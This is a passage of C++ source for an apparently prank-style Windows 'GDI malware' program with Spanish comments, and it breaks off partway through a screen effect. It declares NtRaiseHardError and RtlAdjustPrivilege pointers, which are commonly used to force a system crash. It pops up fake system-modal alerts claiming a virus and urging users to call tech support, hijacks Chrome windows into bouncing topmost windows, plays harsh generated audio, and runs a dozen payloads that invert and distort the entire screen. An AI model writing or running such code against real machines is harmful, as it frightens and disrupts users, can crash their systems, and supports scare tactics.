#include <windows.h>
#include <wingdi.h>
#include <mmsystem.h>
#include <math.h>
#include <stdlib.h>
#include <iostream>
#include <tlhelp32.h>
#include "resources.h"
#include <wbemidl.h>
#include <algorithm>  // Necesario para std::max y std::min
#include <comdef.h>
#include <shellapi.h>
#include <vector>
POINT GetVirtualScreenPos() { return { GetSystemMetrics(SM_XVIRTUALSCREEN), GetSystemMetrics(SM_YVIRTUALSCREEN) }; }
SIZE GetVirtualScreenSize()  { return { GetSystemMetrics(SM_CXVIRTUALSCREEN), GetSystemMetrics(SM_CYVIRTUALSCREEN) }; }
DWORD WINAPI AudioThread(LPVOID param);

typedef void (*AUDIO_SEQUENCE)(int, int, PSHORT);

typedef struct {
    int nSamplesPerSec;
    int nSampleCount;
    AUDIO_SEQUENCE seq;
} AUDIO_PARAMS;

static LPCWSTR cursorsSistema[] = {
    L"IDC_ARROW", L"IDC_APPSTARTING", L"IDC_CROSS", L"IDC_HAND",
    L"IDC_HELP", L"IDC_IBEAM", L"IDC_NO", L"IDC_SIZEALL",
    L"IDC_SIZENESW", L"IDC_SIZENS", L"IDC_SIZENWSE", L"IDC_SIZEWE",
    L"IDC_UPARROW", L"IDC_WAIT"
};

typedef NTSTATUS(NTAPI* pNtRaiseHardError)(
    NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(
    ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

    struct VentanaRebotando {
    HWND hwnd;
    int x, y;
    int vx, vy;
    int w, h;
};

static DWORD g_ultimoMsg = 0;

const char* g_mensajes[] = {
    "ERROR CRITICO: Tu PC esta muriendo",
    "ADVERTENCIA: No apagues la PC",
    "VIRUS DETECTADO: Eliminando archivos...",
    "ERROR 0x0000DEAD: Kernel Panic",
    "ALERTA: CPU al 9999%",
    "Tu PC se va a explotar bro",
    "BSOD inminente en 3... 2... 1...",
    "Llama al soporte tecnico YA",
    "ERROR: No se encontro Windows",
    "CRITICO: El disco duro se esta derritiendo",
};
const int g_numMensajes = 10;

LPCWSTR GenRandomUnicodeString(int len) {
    wchar_t* strRandom = new wchar_t[len + 1];

    for (int i = 0; i < len; i++) {
        strRandom[i] = (rand() % 256) + 1024;
    }

    strRandom[len] = L'\0';

    return strRandom;
}

DWORD WINAPI MsgBoxThread(LPVOID param) {
    const char* msg = (const char*)param;
    MessageBoxA(NULL, msg, "ERROR CRITICO", MB_OK | MB_ICONERROR | MB_TOPMOST | MB_SYSTEMMODAL);
    return 0;
}

static std::vector<VentanaRebotando> g_ventanas;
static DWORD g_ultimaApertura = 0;
static DWORD g_ultimoScan     = 0;
static bool  g_iniciado       = false;
const char* g_urls[] = {
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS7C2hMqlN0gRpQbSGBAuLE7o6m7xBEE6RsSg&s",  // Rickroll
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVo82sXNSNfEN812oa2-EmKelw_EK-y0ux0A&s",                          // Nyan cat
    "https://www.wattpad.com/1399846959-s03e19-sprivy-reimagined-sprivy-reimagined",
    "https://es.mathigon.org/content/fractals/images/mandel/mandel-10.jpg",
    "https://www.youtube.com/watch?v=2gaCCWNCmWA&t=413s",
    "https://www.tiktok.com/@quik837/video/7363819153657974022",
};
const int g_numUrls = 6;
static DWORD g_ultimoTint = 0;

BOOL CALLBACK EnumChromeWindows(HWND hwnd, LPARAM lParam) {
    char cls[256] = {};
    GetClassNameA(hwnd, cls, sizeof(cls));
    if (strcmp(cls, "Chrome_WidgetWin_1") != 0) return TRUE;
    if (!IsWindowVisible(hwnd)) return TRUE;

    RECT r;
    GetWindowRect(hwnd, &r);
    if ((r.right - r.left) < 200 || (r.bottom - r.top) < 200) return TRUE;

    std::vector<HWND>* lista = (std::vector<HWND>*)lParam;
    for (HWND k : *lista) if (k == hwnd) return TRUE;
    lista->push_back(hwnd);
    return TRUE;
}

void ActualizarListaVentanas() {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    std::vector<HWND> encontradas;
    EnumWindows(EnumChromeWindows, (LPARAM)&encontradas);

    for (HWND hwnd : encontradas) {
        bool yaEsta = false;
        for (auto& v : g_ventanas)
            if (v.hwnd == hwnd) { yaEsta = true; break; }

        if (!yaEsta) {
            int wF = 600, hF = 400;
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, wF, hF, SWP_SHOWWINDOW);

            VentanaRebotando v;
            v.hwnd = hwnd;
            v.w = wF; v.h = hF;
            v.x = rand() % (sw - wF);
            v.y = rand() % (sh - hF);
            v.vx = (rand() % 8 + 4) * (rand() % 2 == 0 ? 1 : -1);
            v.vy = (rand() % 8 + 4) * (rand() % 2 == 0 ? 1 : -1);
            g_ventanas.push_back(v);
        }
    }

    // Limpiar las cerradas
    g_ventanas.erase(
        std::remove_if(g_ventanas.begin(), g_ventanas.end(),
            [](const VentanaRebotando& v) { return !IsWindow(v.hwnd); }),
        g_ventanas.end()
    );
}



void RotateDC(HDC hdc, float angleDegrees, POINT center) {
    float angleRad = angleDegrees * (3.14159265f / 180.0f);
    float cosA = cosf(angleRad);
    float sinA = sinf(angleRad);
    XFORM xform;
    xform.eM11 = cosA;  xform.eM12 = sinA;
    xform.eM21 = -sinA; xform.eM22 = cosA;
    xform.eDx = (float)center.x * (1.0f - cosA) + (float)center.y * sinA;
    xform.eDy = (float)center.y * (1.0f - cosA) - (float)center.x * sinA;
    SetGraphicsMode(hdc, GM_ADVANCED);
    ModifyWorldTransform(hdc, &xform, MWT_LEFTMULTIPLY);
}

void AudioSequence1(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    const int kBaseRate = 8000;
    for (int t = 0; t < nSampleCount * 2; t++) {
        int t_scaled = (int)((long long)t * kBaseRate / nSamplesPerSec/2);
        BYTE b = (BYTE)((t_scaled*((3+(1^t_scaled>>10&5))*(5+(3&t_scaled>>14))))>>(t_scaled>>8&3));
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence2(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    const int kBaseRate = 8000;
    for (int t = 0; t < nSampleCount * 2; t++) {
        int ts = (int)((long long)t * kBaseRate/nSamplesPerSec);
        BYTE b = (BYTE)(5*(ts>>6|ts|ts>>7)+5*(ts&ts>>11|ts>>10));
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence3(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    const int kBaseRate = 8000;
    for (int t = 0; t < nSampleCount * 2; t++) {
        int ts = (int)((long long)t * kBaseRate/nSamplesPerSec/2);
        BYTE b = (BYTE)(ts*((ts&4096?ts%65536<59392?7:ts&7:16)^(1&ts>>14))>>(3&(0-ts)>>(ts&2048?2:10)));
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence4(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    const int kBaseRate = 8000;
    for (int t = 0; t < nSampleCount * 2; t++) {
        int ts = (int)((long long)t * kBaseRate/nSamplesPerSec/2);
        BYTE b = (BYTE)(ts*((ts/2>>10|ts%16*ts>>8)&8*ts>>12&18)|-(ts/16)+64);
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence4original(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    for (unsigned long long t = 0; t < (unsigned long long)nSampleCount * 2; t++) {
        BYTE b = (BYTE)(t*((t/2>>10|t%16*t>>8)&8*t>>12&18)|-(t/16)+64);
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence5(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    for (int t = 0; t < nSampleCount * 2; t++) {
        BYTE b = (BYTE)(t>>2)*(t>>5)|t>>5;
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence6(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    for (int t = 0; t < nSampleCount * 2; t++) {
        BYTE b = (BYTE)(100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)));
        ((BYTE*)psSamples)[t] = b;
    }
}

void AudioSequence7(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
    const int kBaseRate = 8000;
    for (int t = 0; t < nSampleCount * 2; t++) {
        int ts = (int)((long long)t * kBaseRate / nSamplesPerSec);
        BYTE b = (BYTE)(ts*(ts/256)-ts*(ts/255)+ts*(ts>>5|ts>>6|ts<<2&ts>>1));
        ((BYTE*)psSamples)[t] = b;
    }
}
void AudioSequenceWhite(int nSamplesPerSec, int nSampleCount, PSHORT buffer) {
    for (int i = 0; i < nSampleCount; i++)
        buffer[i] = (short)(rand() % 65536 - 32768);
}

void AudioSequence8(int nSamplesPerSec, int nSampleCount, PSHORT psSamples) {
   const int kBaseRate = 8000; 
    for (int ts = 0; ts < nSampleCount * 2; ts++) {
        int t = (int)((long long)ts * kBaseRate / nSamplesPerSec/4);
        BYTE b = (BYTE)(t*((t&4096?6:16)+(1&t>>14))>>(3&t>>8)|t>>(t&4096?3:4));
        ((BYTE*)psSamples)[t] = b;
    }
}

void PlayAudio(AUDIO_SEQUENCE seq, int freq = 8000, int sec = 10) {
    int samples = freq * sec;
    PSHORT buf = (PSHORT)HeapAlloc(GetProcessHeap(), 0, samples * 2);
    if (!buf) return;

    WAVEFORMATEX wf = {0};
    wf.wFormatTag      = WAVE_FORMAT_PCM;
    wf.nChannels       = 1;
    wf.nSamplesPerSec  = freq;
    wf.nAvgBytesPerSec = freq * 2;
    wf.nBlockAlign     = 2;
    wf.wBitsPerSample  = 16;

    WAVEHDR hdr = {0};
    hdr.lpData         = (LPSTR)buf;
    hdr.dwBufferLength = samples * 2;

    HWAVEOUT hwo = NULL;
    if (waveOutOpen(&hwo, WAVE_MAPPER, &wf, 0, 0, CALLBACK_NULL) != MMSYSERR_NOERROR) {
        HeapFree(GetProcessHeap(), 0, buf);
        return;
    }

    seq(freq, samples, buf);
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    while (!(hdr.dwFlags & WHDR_DONE)) Sleep(10);
    waveOutReset(hwo);
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
    HeapFree(GetProcessHeap(), 0, buf);
}

DWORD WINAPI AudioThread(LPVOID param) {
    AUDIO_PARAMS* p = (AUDIO_PARAMS*)param;
    PlayAudio(p->seq, p->nSamplesPerSec, p->nSampleCount / p->nSamplesPerSec);
    return 0;
}

void Shader1(int t, int w, int h, RGBQUAD* p) {
    for (int i = 0; i < w * h; i++) {
        COLORREF c = RGB(p[i].rgbRed, p[i].rgbGreen, p[i].rgbBlue);
        c = (c * 2) & 0x00FFFFFF;
        p[i].rgbRed   = GetRValue(c);
        p[i].rgbGreen = GetGValue(c);
        p[i].rgbBlue  = GetBValue(c);
    }
}

void Shader2(int t, int w, int h, RGBQUAD* p) {
    BYTE ph = (t * 17) & 255;
    for (int i = 0; i < w * h; i++) {
        p[i].rgbRed   = ~p[i].rgbRed ^ ph;
        p[i].rgbGreen = ~p[i].rgbGreen + ph;
        p[i].rgbBlue  = p[i].rgbBlue - (ph >> 2);
    }
}

void Shader3(int t, int w, int h, RGBQUAD* pixels) {
    BYTE phase = (t * 5) & 0xFF;
    for (int i = 0; i < w * h; i++) {
        pixels[i].rgbRed   = ~pixels[i].rgbRed   ^ phase;
        pixels[i].rgbGreen = ~pixels[i].rgbGreen + phase;
        pixels[i].rgbBlue  = ~pixels[i].rgbBlue  - (phase >> 1);
    }
}
void ShaderPrimario(int t, int w, int h, RGBQUAD* pixels) {
    // Color de relleno fijo (puedes cambiar estos valores)
    BYTE r = 0;    // Rojo (0 = sin rojo)
    BYTE g = 0;    // Verde
    BYTE b = 0;    // Azul (aquí negro puro)

    // Opcional: haz que el color cambie lentamente con el tiempo (para que no sea estático)
    // Descomenta si quieres efecto sutil
    // r = (BYTE)((t * 3) % 256);
    // g = (BYTE)((t * 5) % 256);
    // b = (BYTE)((t * 7) % 256);

    // Rellena TODOS los píxeles con el color elegido
    for (int i = 0; i < w * h; i++) {
        pixels[i].rgbRed   = r;
        pixels[i].rgbGreen = g;
        pixels[i].rgbBlue  = b;
    }
}

static RGBQUAD* g_Shader4Buf = NULL;
static int      g_Shader4BufSize = 0;

void Shader4(int t, int w, int h, RGBQUAD* pixels) {
    int needed = w * h;
    if (needed > g_Shader4BufSize) {
        free(g_Shader4Buf);
        g_Shader4Buf = (RGBQUAD*)malloc(needed * sizeof(RGBQUAD));
        g_Shader4BufSize = needed;
    }
    if (!g_Shader4Buf) return;

    RGBQUAD* temp = g_Shader4Buf;
    memcpy(temp, pixels, needed * sizeof(RGBQUAD));

    float angle = (float)(t * 0.8f) * 0.0174532925f;
    float cosA = cosf(angle);
    float sinA = sinf(angle);
    float cx = (float)w / 2.0f;
    float cy = (float)h / 2.0f;

    for (int y = 0; y < h; y++) {
        for (int x = 0; x < w; x++) {
            float dx = (float)x - cx;
            float dy = (float)y - cy;
            float srcX = cx + dx * cosA - dy * sinA;
            float srcY = cy + dx * sinA + dy * cosA;
            int ix = (int)srcX;
            int iy = (int)srcY;
            float fx = srcX - (float)ix;
            float fy = srcY - (float)iy;

            if (ix < 0 || ix >= w-1 || iy < 0 || iy >= h-1) {
                pixels[y * w + x] = temp[y * w + x];
                continue;
            }

            RGBQUAD c00 = temp[iy * w + ix];
            RGBQUAD c10 = temp[iy * w + (ix+1)];
            RGBQUAD c01 = temp[(iy+1) * w + ix];
            RGBQUAD c11 = temp[(iy+1) * w + (ix+1)];

            int r0 = (int)((1-fx)*c00.rgbRed   + fx*c10.rgbRed);
            int g0 = (int)((1-fx)*c00.rgbGreen + fx*c10.rgbGreen);
            int b0 = (int)((1-fx)*c00.rgbBlue  + fx*c10.rgbBlue);
            int r1 = (int)((1-fx)*c01.rgbRed   + fx*c11.rgbRed);
            int g1 = (int)((1-fx)*c01.rgbGreen + fx*c11.rgbGreen);
            int b1 = (int)((1-fx)*c01.rgbBlue  + fx*c11.rgbBlue);

            int r = (int)((1-fy)*r0 + fy*r1);
            int g = (int)((1-fy)*g0 + fy*g1);
            int b = (int)((1-fy)*b0 + fy*b1);

            RGBQUAD neigh = temp[y * w + x];
            r = (r*6 + neigh.rgbRed*2)   / 8;
            g = (g*6 + neigh.rgbGreen*2) / 8;
            b = (b*6 + neigh.rgbBlue*2)  / 8;

            pixels[y*w+x].rgbRed   = (BYTE)(r & 0xFF);
            pixels[y*w+x].rgbGreen = (BYTE)(g & 0xFF);
            pixels[y*w+x].rgbBlue  = (BYTE)(b & 0xFF);
        }
    }
}

void Shader5(int t, int w, int h, RGBQUAD* pixels) {
    RGBQUAD* temp = (RGBQUAD*)malloc(w * h * sizeof(RGBQUAD));
    if (!temp) return;
    memcpy(temp, pixels, w * h * sizeof(RGBQUAD));

    float fuerza    = 12.0f;
    float velocidad = t * 0.35f;
    float ruidoX = sinf(velocidad * 13.17f) * fuerza;
    float ruidoY = cosf(velocidad * 17.89f) * fuerza;
    ruidoX += (float)((rand() % 1000) - 500) / 100.0f * 4.0f;
    ruidoY += (float)((rand() % 1000) - 500) / 100.0f * 4.0f;

    for (int y = 0; y < h; y++) {
        for (int x = 0; x < w; x++) {
            int srcX = x + (int)ruidoX;
            int srcY = y + (int)ruidoY;
            if (srcX < 0 || srcX >= w || srcY < 0 || srcY >= h) {
                pixels[y*w+x] = temp[y*w+x];
                continue;
            }
            pixels[y*w+x] = temp[srcY*w+srcX];
        }
    }
    free(temp);
}

const char* GetAssetPath(const char* filename) {
    static char fullPath[MAX_PATH];
    GetModuleFileNameA(NULL, fullPath, MAX_PATH);
    char* lastSlash = strrchr(fullPath, '\\');
    if (lastSlash) *(lastSlash + 1) = '\0';
    strcat(fullPath, "assets\\");
    strcat(fullPath, filename);
    return fullPath;
}

void Payload1(int t, HDC hdc) {
    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();
    HBRUSH br = CreateSolidBrush(RGB(t%256, (t/2)%256, (t/2)%256));
    SelectObject(hdc, br);
    PatBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, PATINVERT);
    DeleteObject(br);
}

void Payload2(int t, HDC hdc) {
    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();
    HBRUSH br = CreateSolidBrush(RGB(200+(t%56), (t*3)%128, 60-(t%60)));
    SelectObject(hdc, br);
    PatBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, PATINVERT);
    DeleteObject(br);
}

void Payload3(int t, HDC hdc) {
    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    static float lastFactor = 0.3f;
    float sinWave = sinf((float)t * 0.07f) * 0.5f + 0.5f;
    float noise   = ((float)(rand() % 1000) / 1000.0f) * 0.35f - 0.175f;
    float factor  = sinWave + noise;
    if (factor < 0) factor = 0;
    if (factor > 1) factor = 1;
    factor = (factor * 0.35f) + (lastFactor * 0.65f);
    lastFactor = factor;

    int BLOCK_SIZE = (int)(8 + factor * 112);

    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sz.cx, sz.cy);
    if (!hbmMem) { DeleteDC(hdcMem); return; }
    HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hbmMem);

    BitBlt(hdcMem, 0, 0, sz.cx, sz.cy, hdc, pt.x, pt.y, SRCCOPY);

    for (int y = 0; y < sz.cy; y += BLOCK_SIZE) {
        for (int x = 0; x < sz.cx; x += BLOCK_SIZE) {
            COLORREF col = GetPixel(hdcMem, x, y);
            HBRUSH br = CreateSolidBrush(col);
            RECT r = { x, y, x+BLOCK_SIZE, y+BLOCK_SIZE };
            FillRect(hdcMem, &r, br);
            DeleteObject(br);
        }
    }

    BitBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, hdcMem, 0, 0, SRCCOPY);
    SelectObject(hdcMem, hOld);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

void Payload4(int t, HDC hdcScreen) {
    POINT ptScreen = GetVirtualScreenPos();
    SIZE szScreen = GetVirtualScreenSize();

    HDC hcdc = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
    HBITMAP hOld = (HBITMAP)SelectObject(hcdc, hBitmap);

    BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy,
           hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

    const int BLOCK = 10;
    for (int j = 0; j < szScreen.cy; j += BLOCK) {
        for (int i = 0; i < szScreen.cx; i += BLOCK) {
            COLORREF col = GetPixel(hcdc, i, j);
            HBRUSH br = CreateSolidBrush(col);
            RECT r = { i, j, i+BLOCK, j+BLOCK };
            FillRect(hcdc, &r, br);
            DeleteObject(br);
        }
    }

    BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy,
           hcdc, 0, 0, SRCCOPY);

    SelectObject(hcdc, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hcdc);
}

void Payload5(int t, HDC hdc) {
    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    BitBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, hdc, pt.x, pt.y, NOTSRCCOPY);

    int r = (t * 13) % 256;
    int g = ((t * 7) + 128) % 256;
    int b = ((t * 19) + 64) % 256;

    if (t % 60 < 20) {
        r = 255 - (t % 100);
        g = (t * 5) % 256;
        b = 128 + (t % 128);
    } else if (t % 60 < 40) {
        r = 0;
        g = 255 - (t % 200);
        b = (t * 11) % 256;
    }

    HBRUSH br = CreateSolidBrush(RGB(r, g, b));
    SelectObject(hdc, br);
    PatBlt(hdc, pt.x, pt.y, sz.cx, sz.cy, PATINVERT);
    DeleteObject(br);
}

void Payload6(int t, HDC hdcScreen) {
    POINT ptScreen = GetVirtualScreenPos();
    SIZE szScreen = GetVirtualScreenSize();

    HDC hcdc = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
    HBITMAP hOld = (HBITMAP)SelectObject(hcdc, hBitmap);
    BitBlt(hcdc, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);

    BLENDFUNCTION blf = {0};
    blf.BlendOp             = AC_SRC_OVER;
    blf.BlendFlags          = 0;
    blf.SourceConstantAlpha = 128;
    blf.AlphaFormat         = 0;

    AlphaBlend(hdcScreen,
               ptScreen.x + t % 200 + 10, ptScreen.y - t % 25,
               szScreen.cx, szScreen.cy,
               hcdc, ptScreen.x, ptScreen.y,
               szScreen.cx, szScreen.cy, blf);

    SelectObject(hcdc, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hcdc);
    Sleep(20);
}

void Payload7(int t, HDC hdcScreen) {
    POINT ptScreen = GetVirtualScreenPos();
    SIZE szScreen = GetVirtualScreenSize();

    HDC hdcSnap = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmpSnap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
    HBITMAP hOldSnap = (HBITMAP)SelectObject(hdcSnap, hBmpSnap);

    BitBlt(hdcSnap, 0, 0, szScreen.cx, szScreen.cy,
           hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

    POINT pt[3];
    pt[0] = { ptScreen.x,               ptScreen.y };
    pt[1] = { ptScreen.x + szScreen.cx, ptScreen.y };
    pt[2] = { ptScreen.x + 25,          ptScreen.y + szScreen.cy };

    PlgBlt(hdcScreen, pt, hdcSnap, 0, 0, szScreen.cx, szScreen.cy, NULL, 0, 0);

    HBRUSH hBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256));
    HBRUSH hOldBrush = (HBRUSH)SelectObject(hdcScreen, hBrush);
    PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
    SelectObject(hdcScreen, hOldBrush);
    DeleteObject(hBrush);

    SelectObject(hdcSnap, hOldSnap);
    DeleteObject(hBmpSnap);
    DeleteDC(hdcSnap);
}

void Payload8(int t, HDC hdcScreen) {
    POINT ptScreen = GetVirtualScreenPos();
    SIZE szScreen = GetVirtualScreenSize();
    t *= 10;

    HDC hdcTemp = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcTemp, hBmp);

    BitBlt(hdcTemp, 0, 0, szScreen.cx, szScreen.cy,
           hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

    BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy,
           hdcTemp, t % szScreen.cx, t % szScreen.cy, NOTSRCERASE);

    SelectObject(hdcTemp, hOldBmp);
    DeleteObject(hBmp);
    DeleteDC(hdcTemp);

    HBRUSH hBrush = CreateSolidBrush(RGB(rand()%256, rand()%256, rand()%256));
    HBRUSH hOldBrush = (HBRUSH)SelectObject(hdcScreen, hBrush);
    PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
    SelectObject(hdcScreen, hOldBrush);
    DeleteObject(hBrush);
}

void Payload9(int t, HDC hdcScreen) {
    SIZE szScreen = GetVirtualScreenSize();
    int w = szScreen.cx, h = szScreen.cy;

    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth       = w;
    bmi.bmiHeader.biHeight      = -h;
    bmi.bmiHeader.biPlanes      = 1;
    bmi.bmiHeader.biBitCount    = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* pixels = nullptr;
    HDC hcdc = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS,
                                       (void**)&pixels, NULL, 0);
    HGDIOBJ hOld = SelectObject(hcdc, hBitmap);

    BitBlt(hcdc, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
    Shader3(t, w, h, pixels);

    POINT centro = { w / 2, h / 2 };
    RotateDC(hcdc, (t % 2 == 0) ? 1.0f : -1.0f, centro);
    SetBkColor(hcdc,   RGB(rand()%256, rand()%256, rand()%256));
    SetTextColor(hcdc, RGB(rand()%256, rand()%256, rand()%256));
    TextOutA(hcdc, rand() % w, rand() % h, "SprigYSol", 9);

    XFORM xid = {1,0,0,1,0,0};
    SetWorldTransform(hcdc, &xid);

    BLENDFUNCTION blf = {AC_SRC_OVER, 0, 128, 0};
    AlphaBlend(hdcScreen, 0, 0, w, h, hcdc, 0, 0, w, h, blf);

    SelectObject(hcdc, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hcdc);
}

void Payload10(int t, HDC hdcScreen) {
    POINT pt = GetVirtualScreenPos();
    SIZE sz = GetVirtualScreenSize();

    static HBITMAP hImg = NULL;
    static BITMAP bm = {};
    
    if (!hImg) {
    // Verificar header del BMP
    FILE* f = fopen(GetAssetPath("image.bmp"), "rb");
    if (!f) {
        MessageBoxA(NULL, "No abre el archivo", "Debug", MB_OK);
        return;
    }
    /*char header[2];
    fread(header, 1, 2, f);
    DWORD fileSize;
    fread(&fileSize, 4, 1, f);
    fseek(f, 28, SEEK_SET); // offset bits per pixel
    WORD bpp;
    fread(&bpp, 2, 1, f);
    fclose(f);

    char msg[128];
    sprintf(msg, "Header: %c%c | Tamano: %lu | BitsPerPixel: %d", 
            header[0], header[1], fileSize, bpp);
    MessageBoxA(NULL, msg, "Debug", MB_OK);*/
}

    HDC hdcImg = CreateCompatibleDC(hdcScreen);
    HBITMAP hOld = (HBITMAP)SelectObject(hdcImg, hImg);

    int rangoX = sz.cx - bm.bmWidth;
    int rangoY = sz.cy - bm.bmHeight;
    if (rangoX < 1) rangoX = 1;
    if (rangoY < 1) rangoY = 1;

    int cantidad = 3 + (t / 15);
    if (cantidad > 20) cantidad = 20;

    for (int i = 0; i < cantidad; i++) {
        int x = pt.x + rand() % rangoX;
        int y = pt.y + rand() % rangoY;
        BitBlt(hdcScreen, x, y, bm.bmWidth, bm.bmHeight, hdcImg, 0, 0, SRCCOPY);
    }

    SelectObject(hdcImg, hOld);
    DeleteDC(hdcImg);
}
// Payload "ojo de pez inverso" (túnel hacia atrás)
// t = tiempo para animación, hdc = contexto de pantalla
// Payload11 - Túnel hacia atrás (ojo de pez inverso) - versión rápida y estable
void Payload11(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer temporal
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ oldBmp = SelectObject(hdcMem, hbmMem);

    // Captura la pantalla actual
    BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    // Parámetros del túnel (ajustados para efecto remolino hacia atrás)
    double zoom = 1.0 + sin(t * 0.05) * 0.25;     // Zoom pulsante hacia atrás
    double rotate = t * 0.04;                     // Rotación lenta
    double strength = 1.4 + sin(t * 0.07) * 0.3;  // Intensidad del hundimiento

    // Puntos para PlgBlt (distorsión perspectiva + rotación + zoom)
    POINT pts[3];
    double cosA = cos(rotate);
    double sinA = sin(rotate);
    double cx = sw / 2.0;
    double cy = sh / 2.0;

    pts[0].x = (int)(cx + (0 - cx) * zoom * cosA - (0 - cy) * zoom * sinA);
    pts[0].y = (int)(cy + (0 - cx) * zoom * sinA + (0 - cy) * zoom * cosA);
    pts[1].x = (int)(cx + (sw - cx) * zoom * cosA - (0 - cy) * zoom * sinA);
    pts[1].y = (int)(cy + (sw - cx) * zoom * sinA + (0 - cy) * zoom * cosA);
    pts[2].x = (int)(cx + (0 - cx) * zoom * cosA - (sh - cy) * zoom * sinA);
    pts[2].y = (int)(cy + (0 - cx) * zoom * sinA + (sh - cy) * zoom * cosA);

    // Aplica el efecto túnel con PlgBlt
    PlgBlt(hdc, pts, hdcMem, 0, 0, sw, sh, NULL, 0, 0);

    // Tinte caótico (colores que se mueven como en el video)
    HBRUSH hBrush = CreateSolidBrush(RGB((t * 19) % 255, (t * 37) % 255, (t * 61) % 255));
    HGDIOBJ oldBrush = SelectObject(hdc, hBrush);
    PatBlt(hdc, 0, 0, sw, sh, PATINVERT);  // Inversión parcial para más caos
    SelectObject(hdc, oldBrush);
    DeleteObject(hBrush);

    // Ruido pixelado ligero (para que se vea "sucio" y glitch como en Solaris)
    for (int i = 0; i < 3000; i++) {  // Ajusta número para más/menos ruido
        int rx = rand() % sw;
        int ry = rand() % sh;
        SetPixel(hdc, rx, ry, RGB(rand() % 255, rand() % 255, rand() % 255));
    }

    // Limpieza obligatoria
    SelectObject(hdcMem, oldBmp);
    DeleteObject(hbmMem);
    DeleteDC(hdcMem);
}

// Payload "Solaris Tunnel" - remolino/túnel hacia atrás optimizado (rápido y estable)
// t = tiempo (frame), hdc = contexto de pantalla
void Payload12(int t, HDC hdc) {
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    // Buffer temporal
    HDC hdcMem = CreateCompatibleDC(hdc);
    HBITMAP hbmMem = CreateCompatibleBitmap(hdc, sw, sh);
    HGDIOBJ old = SelectObject(hdcMem, hbmMem);

    // Captura pantalla
    BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

    // Centro
    int cx = sw / 2;
    int cy = sh / 2;

    // Parámetros del túnel (ajustados para parecerse al video)
